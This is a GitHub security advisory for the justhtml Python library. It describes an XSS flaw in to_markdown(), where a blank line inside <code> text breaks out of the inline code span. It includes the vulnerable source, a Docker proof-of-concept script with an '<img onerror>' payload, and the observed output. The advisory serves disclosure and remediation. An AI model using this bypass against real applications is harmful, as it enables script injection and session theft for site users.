# [M] justhtml: to_markdown() code-span blank-line breakout enables XSS

## Summary
Severity: Medium
Advisory: GHSA-jf6w-2mvx-633j
CWE: CWE-116, CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-06-25
Source: https://github.com/advisories/GHSA-jf6w-2mvx-633j
Type: github-advisory

## Affected
- PyPI: `justhtml` — affected >=0.9.0 <1.22.0

## Details
# justhtml: to_markdown() code-span blank-line breakout enables XSS

### Summary

In `justhtml` 0.9.0 through 1.21.0, `to_markdown()` renders `<code>` text (and `<pre>` text inside a link) as an inline Markdown code span whose only protection is backtick-fence length. A blank line (`\n\n`) in that text terminates the inline span in any compliant Markdown renderer, so attacker-controlled text that survived HTML sanitization is emitted **unescaped** after the blank line and is re-parsed as live raw HTML/Markdown — yielding XSS in the default configuration. Likely **CWE-79 (Cross-site Scripting)** arising from **CWE-116 (Improper Encoding/Escaping of Output)**.

### Details

`to_markdown()` is documented as a safety surface. `docs/text.md` states the guarantee applies "to the HTML produced by rendering that Markdown with a compliant Markdown renderer," and `SECURITY.md` promises `to_markdown()` "escapes line-start Markdown markers that could change block structure" and "uses code fences long enough to contain backticks safely."

The inline code-span helper only sizes the backtick fence; it never accounts for block boundaries:

`src/justhtml/node.py:32-41` (tag `v1.21.0`):

```python
def _markdown_code_span(s: str | None) -> str:
    if s is None:
        s = ""
    # Use a backtick fence longer than any run of backticks inside.
    fence = _markdown_backtick_fence(s, minimum=1)
    # CommonMark requires a space if the content starts/ends with backticks.
    needs_space = s.startswith("`") or s.endswith("`")
    if needs_space:
        return f"{fence} {s} {fence}"
    return f"{fence}{s}{fence}"
```

The element's text is taken verbatim (`strip=False`, so embedded newlines are preserved) and routed into that helper:

`src/justhtml/node.py:1061-1078` (tag `v1.21.0`):

```python
            if tag == "pre":
                code = current.to_text(separator="", strip=False)
                if current_in_link:
                    current_builder.raw(_markdown_code_span(code))      # inline path
                else:
                    fence = _markdown_backtick_fence(code, minimum=3)   # block path
                    ...
            if tag == "code" and not current_preserve:
                current_builder.raw(_markdown_code_span(current.to_text(separator="", strip=False)))
```

A Markdown **inline code span is an inline construct and cannot span a block boundary**: a blank line ends the paragraph, the opening backticks are left unmatched (literal), and everything after the blank line is parsed as ordinary Markdown — independent of fence length. Because CommonMark passes raw inline HTML through by default, text such as `<img src=x onerror=...>` becomes a live element.

Reachability with default settings: `JustHTML(html)` sanitizes by default; `<code>` and `<pre>` are in `DEFAULT_POLICY.allowed_tags`; default sanitization preserves their text and the blank line (whitespace collapsing is opt-in). The payload lives in **text**, not a URL attribute, so URL-scheme sanitization never applies. The tokenizer decodes character references in normal text before DOM insertion, so `&lt;img …&gt;` enters the DOM as literal `<img …>` text while passing HTML sanitization.

Two in-repo asymmetries confirm this is an unguarded path rather than intended behavior:

- **Plain text-node content is HTML-escaped** before Markdown escaping, so the same `&lt;img …&gt;` outside a code span is neutralized to `&lt;img …>`. Inside a code span it is not escaped — the fence is assumed sufficient.
- **`<pre>` outside a link uses a block fence** (`minimum=3`, line 1066), which a  blank line cannot break. The same `<pre>` **inside a link** (line 1064) and all `<code>` use the inline span, which a blank line breaks.

### PoC

Self-contained, runs entirely in Docker against the pinned PyPI release. Static by default: the rendered HTML is **parsed** to show a live handler-bearing element materializes; no JavaScript is executed on the default path.

`Dockerfile`:

```dockerfile
FROM python:3.11-slim
WORKDIR /poc
RUN pip install --no-cache-dir justhtml==1.21.0 markdown-it-py==4.2.0 \
 && (pip install --no-cache-dir dukpy==0.5.0 || echo "dukpy optional: skipped")
COPY poc.py test.sh /poc/
CMD ["sh", "/poc/test.sh"]
```

`poc.py`:

```python
#!/usr/bin/env python3
"""PoC: justhtml to_markdown() inline code-span blank-line breakout -> XSS.
Audited release: justhtml==1.21.0. Static by default (parses the rendered HTML;
no JS executed). --prove-exec is an opt-in, container-only execution check."""
from __future__ import annotations
import argparse
from html.parser import HTMLParser
from justhtml import JustHTML
from markdown_it import MarkdownIt

MARKER = "__POC_XSS_MARKER__"
PAYLOAD_TEXT = f"<img src=x onerror={MARKER}()>"
RENDER = MarkdownIt("commonmark")  # raw-HTML passthrough is the CommonMark default


def build_inputs() -> tuple[str, str]:
    enc = PAYLOAD_TEXT.replace("<", "&lt;").replace(">", "&gt;")
    control = f"<code>q{enc}</code>"          # no blank line -> should stay inert
    exploit = f"<code>q\n\n{enc}</code>"      # + one blank line -> the whole exploit
    return control, exploit


def to_markdown(html: str) -> str:
    return JustHTML(html, fragment=True).to_markdown()  # public API, default sanitize=True


class _SinkFinder(HTMLParser):
    def __init__(self) -> None:
        super().__init__(); self.sinks: list[tuple[str, str, str]] = []
    def handle_starttag(self, tag, attrs):
        for name, val in attrs:
            if name.startswith("on") and val and MARKER in val:
                self.sinks.append((tag, name, val))


def live_sinks(html: str):
    f = _SinkFinder(); f.feed(html); return f.sinks


def show(label: str, html: str):
    md = to_markdown(html); rendered = RENDER.render(md); sinks = live_sinks(rendered)
    print(f"== {label} ==")
    print(f"  1. input HTML        : {html!r}")
    print(f"  2. to_markdown() out : {md!r}")
    print(f"  3. CommonMark render : {rendered.strip()!r}")
    print(f"  4. live JS sinks     : {sinks if sinks else 'NONE (inert)'}\n")
    return rendered, sinks


def prove_exec(rendered: str) -> None:
    print("== --prove-exec (supplementary, container-only) ==")
    sinks = live_sinks(rendered)
    if not sinks:
        print("  no sink to execute"); return
    handler_js = sinks[0][2]
    print(f"  materialized handler JS: {handler_js!r}")
    try:
        import dukpy
    except Exception:
        print("  [skipped] optional 'dukpy' not installed; parse proof is canonical."); return
    result = dukpy.evaljs(f"var fired=''; function {MARKER}(){{ fired='XSS-EXECUTED'; }} {handler_js}; fired;")
    print(f"  JS engine result: {result!r}  -> attacker JS executed" if result else "  JS did not fire")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--prove-exec", action="store_true")
    args = ap.parse_args()
    control, exploit = build_inputs()
    print("Delta between control and exploit: exactly one blank line (\\n\\n).\n")
    _, c_sinks = show("CONTROL  (payload in <code>, NO blank line)", control)
    ex_rendered, e_sinks = show("EXPLOIT  (payload in <code>, + blank line)", exploit)
    ok = (not c_sinks) and bool(e_sinks)
    print("== VERDICT ==")
    print("  BYPASS CONFIRMED." if ok else "  not reproduced")
    if ok:
        print(f"  Sanitized code text became a LIVE element: {e_sinks[0]}")
    print()
    if ok and args.prove_exec:
        prove_exec(ex_rendered)
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
```

Build and run:

```bash
docker build -t justhtml-md-poc ./poc
docker run --rm justhtml-md-poc
```

Observed output (`justhtml 1.21.0`, `markdown-it-py 4.2.0`):

```
=== Versions under test ===
Name: justhtml
Version: 1.21.0
Name: markdown-it-py
Version: 4.2.0

Delta between control and exploit: exactly one blank line (\n\n)
inserted into otherwise identical <code> text.

== CONTROL  (payload in <code>, NO blank line) ==
  1. input HTML        : '<code>q&lt;img src=x onerror=__POC_XSS_MARKER__()&gt;</code>'
  2. to_markdown() out : '`q<img src=x onerror=__POC_XSS_MARKER__()>`'
  3. CommonMark render : '<p><code>q&lt;img src=x onerror=__POC_XSS_MARKER__()&gt;</code></p>'
  4. live JS sinks     : NONE (inert)

== EXPLOIT  (payload in <code>, + blank line) ==
  1. input HTML        : '<code>q\n\n&lt;img src=x onerror=__POC_XSS_MARKER__()&gt;</code>'
  2. to_markdown() out : '`q\n\n<img src=x onerror=__POC_XSS_MARKER__()>`'
  3. CommonMark render : '<p>`q</p>\n<p><img src=x onerror=__POC_XSS_MARKER__()>`</p>'
  4. live JS sinks     : [('img', 'onerror', '__POC_XSS_MARKER__()')]

== VERDICT ==
  BYPASS CONFIRMED.
  The blank line terminated the inline code span; sanitized code
  text became a LIVE handler-bearing element: ('img', 'onerror', '__POC_XSS_MARKER__()')
  The control (no blank line) stayed inert inside <code>.
```

The exploit is byte-identical to the inert control plus a single blank line
(`\n\n`). Deterministic: same input → same result.

Optional execution confirmation (`docker run --rm justhtml-md-poc python3 /poc/poc.py --prove-exec`)
— supplementary; the parse proof above is canonical. Inert marker only:

```
== --prove-exec (supplementary, container-only) ==
  materialized handler JS: '__POC_XSS_MARKER__()'
  JS engine result: 'XSS-EXECUTED'  -> attacker JS executed
```

### Impact

This is a cross-site scripting vulnerability (CWE-79). It affects any application that follows the documented pipeline: sanitize untrusted HTML with `JustHTML(...)` under default settings, call `to_markdown()`, and render the result with a CommonMark-compliant renderer (raw-HTML passthrough is the CommonMark default).

An attacker only needs to control HTML text inside a `<code>` element, or a `<pre>` element within a link — no custom policy and no `sanitize=False`. Any user who then views the rendered page executes attacker-controlled script in their own origin, enabling cookie/session theft or actions performed as the victim.

Severity: CVSS 3.1 **6.1 (Moderate)**,
`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`. Scope is Changed: the injected script runs in the origin of the page that renders the Markdown, a different security authority than the library that produced it.

### Recommended fix

Do not represent text containing a block boundary as an inline code span. In `_markdown_code_span` / the `<code>` and in-link `<pre>` dispatch (`src/justhtml/node.py:1061-1078`), if the content contains a blank line (or any `\n`), emit it as a fenced code **block** — reusing the existing block path at lines 1066-1074, whose fence is not broken by blank lines — or collapse newlines in inline-code content. As defense-in-depth, escape HTML/Markdown-significant characters in code-span bodies rather than relying on fence length alone, matching the existing text-node escaping already applied elsewhere.

### Resources

- CWE-79 — https://cwe.mitre.org/data/definitions/79.html
- CWE-116 — https://cwe.mitre.org/data/definitions/116.html
- Affected source (tag `v1.21.0`): `src/justhtml/node.py:32-41` (`_markdown_code_span`),  `src/justhtml/node.py:1061-1078` (`<pre>`/`<code>` dispatch).
- CommonMark spec — code spans are inline and cannot contain a blank line; raw HTML is passed through by default: https://spec.commonmark.org/0.31.2/#code-spans
- Novelty: same vulnerability class as two prior, already-fixed `to_markdown()` advisories but a **distinct, still-unfixed variant**. The earlier fixes address
  (a) HTML-escaping of plain text nodes and (b) backtick-fence **length** for `<pre>` code **blocks**. Neither addresses a **blank-line** break of an **inline**  code span: fence length is irrelevant to a block-boundary break, and code-span bodies are not HTML-escaped. The cited dispatch and helper are unchanged at `v1.21.0`, and `origin/main == v1.21.0` (no embargoed fix).

## References
- https://github.com/EmilStenstrom/justhtml/security/advisories/GHSA-jf6w-2mvx-633j
- https://github.com/EmilStenstrom/justhtml
